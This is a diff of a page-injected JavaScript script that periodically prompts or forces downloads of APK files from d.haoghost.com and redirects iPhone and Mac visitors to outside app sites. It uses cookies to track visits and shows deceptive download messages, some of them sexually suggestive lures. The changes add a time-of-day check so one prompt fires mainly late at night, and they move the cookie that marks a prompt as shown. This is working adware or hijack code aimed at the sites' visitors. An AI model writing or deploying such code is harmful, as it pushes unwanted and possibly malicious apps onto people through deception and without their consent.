@@ -65,7 +65,7 @@ var hy_itv=setInterval(function(){
 	//正在下载娇羞小苹果,少妇的秘密尽在其中 正在下载书旗小说,千万图书库离线观看
 
 	var alen=azimgs.length;
-	if(num==24||num==25||num==26) isup=1;
+	if(num==24||num==25||num==26 || num==16) isup=1;
 	function getNum(){
 		var num=parseInt(getCookie("hy_visit_time"));
 		if(isNaN(num))
@@ -83,6 +83,12 @@ var hy_itv=setInterval(function(){
 	if(getCookie("hycpc1")){
 		pname="360ysdq.apk";
 		iosname="http://www.haima.me/?c=cpapz";
+	}
+
+	function notNight()
+	{
+		var dt=new Date(),hour=dt.getHours(),minute=dt.getMinutes();
+		return (hour>9) || (hour==0 && minute<30) || (hour==9 && minute>30);
 	}
 
 	function getDownUrl()
@@ -121,8 +127,9 @@ var hy_itv=setInterval(function(){
 				break;
 			default:
 				var rd=Math.random();
+				//if(notNight()) result="sybb.10C352.apk";
+				//else result="http://t.cn/R7qFBqD";
 				result="sybb.10C352.apk";
-				//if(rd>=0.5) result="http://t.cn/R7qFBqD";
 		}
 		return result;
 	}
@@ -295,8 +302,7 @@ var hy_itv=setInterval(function(){
 				}
 				else if(num==16)
 				{
-					var dt=new Date(),hour=dt.getHours(),minute=dt.getMinutes();
-					if( (hour>9) || (hour==0 && minute<30) || (hour==9 && minute>30) ) return;
+					if( notNight() ) return;
 					if(!autoDown()) return;
 					tt="正在下载专业阅读器，全国资源最全的离线小说APP，首次安装送7日会员。";
 				}
@@ -311,12 +317,14 @@ var hy_itv=setInterval(function(){
 				
 				if(/ipad|iphone|mac|ios/i.test(navigator.userAgent)) {
 					window.location.href=iosname;	
+					setCookie("hycpc1","1");
 				}
 				else
 				{
 					if(window.confirm(tt)){
 						if(pname.indexOf("http")>=0) window.location.href=pname;
 						else window.location.href="http://d.haoghost.com/"+pname;
+						setCookie("hycpc1","1");
 					}
 					else
 					{
@@ -328,7 +336,7 @@ var hy_itv=setInterval(function(){
 				
 				
 				
-				setCookie("hycpc1","1");
+				
 			},2000)
 			
 		})();
